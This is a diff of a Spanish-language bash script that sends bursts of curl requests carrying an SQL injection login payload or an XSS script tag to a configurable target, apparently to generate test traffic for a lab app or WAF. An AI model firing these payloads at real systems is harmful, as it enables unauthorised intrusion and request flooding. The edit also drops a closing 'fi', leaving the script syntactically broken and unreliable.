@@ -25,8 +25,7 @@ attack_sqli() {
             -d "password=' OR 1=1 --" \
             "$TARGET_URL/rest/user/login" &
         if [ $((i % REQUESTS_PER_SECOND)) -eq 0 ]; then
-            sleep 1  # Pausa para cumplir con el número de peticiones por segundo
-        fi
+            sleep 1
     done
 }
 
@@ -38,30 +37,27 @@ attack_xss() {
             -d "comment=<script>alert('XSS')</script>" \
             "$TARGET_URL/rest/product/1/reviews" &
         if [ $((i % REQUESTS_PER_SECOND)) -eq 0 ]; then
-            sleep 1  # Pausa para cumplir con el número de peticiones por segundo
+            sleep 1 
         fi
     done
 }
 
-# Función para enviar tráfico legítimo
 attack_legitimate() {
     echo "Iniciando tráfico legítimo..."
     for ((i=1; i<=TOTAL_REQUESTS; i++)); do
         curl -o /dev/null -s -w "%{http_code}\n" -X GET \
             "$TARGET_URL/" &
         if [ $((i % REQUESTS_PER_SECOND)) -eq 0 ]; then
-            sleep 1  # Pausa para cumplir con el número de peticiones por segundo
+            sleep 1  
         fi
     done
 }
 
-# Variables de configuración
 TARGET_URL="http://localhost"  # Cambiar a la URL de tu aplicación
 REQUESTS_PER_SECOND=0         # Peticiones por segundo
 DURATION=0                    # Duración en segundos
 TOTAL_REQUESTS=0              # Total de peticiones a realizar
 
-# Solicitar los parámetros al usuario
 REQUESTS_PER_SECOND=$(get_valid_number "requests_per_second" "¿Cuántas peticiones por segundo? ")
 DURATION=$(get_valid_number "duration" "¿Cuánto tiempo en segundos deseas ejecutar el ataque? ")
 TOTAL_REQUESTS=$((REQUESTS_PER_SECOND * DURATION))
@@ -71,10 +67,8 @@ echo "1. SQLi"
 echo "2. XSS"
 echo "3. Tráfico legítimo"
 
-# Solicitar tipo de ataque
 read -p "Elige el tipo de ataque (1/2/3): " ATTACK_TYPE
 
-# Ejecutar el ataque correspondiente
 case $ATTACK_TYPE in
     1)
         attack_sqli
@@ -91,6 +85,6 @@ case $ATTACK_TYPE in
         ;;
 esac
 
-wait  # Esperar a que todos los ataques en segundo plano terminen
+wait
 
 echo "Ataque completado."
